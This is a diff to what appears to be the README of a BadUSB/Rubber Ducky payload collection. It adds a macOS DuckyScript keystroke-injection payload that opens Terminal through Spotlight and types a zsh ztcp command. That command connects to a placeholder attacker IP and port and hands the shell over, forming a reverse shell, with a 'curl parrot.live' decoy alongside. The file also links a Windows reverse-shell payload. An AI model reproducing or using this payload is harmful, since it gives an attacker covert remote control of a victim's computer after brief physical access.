@@ -119,7 +119,17 @@ access to the targeted machine.
 
     ```duckyscript
     REM --- MACOS REVERSE SHELL ---
-    GUI r
+    DEFAULT_DELAY 14
+    DELAY 1000
+    GUI SPACE
+    DELAY 500
+    STRING terminal
+    DELAY 500
+    ENTER
+    DELAY 1000
+    STRING zsh -c 'zmodload zsh/net/tcp && ztcp <IP-HERE> <PORT-HERE> && zsh >&$REPLY 2>&$REPLY 0>&$REPLY' & curl parrot.live
+    DELAY 500
+    ENTER
     ```
 
   * Windows: [ZTW/Payloads (github.com)](windows-revershell-payload.txt)
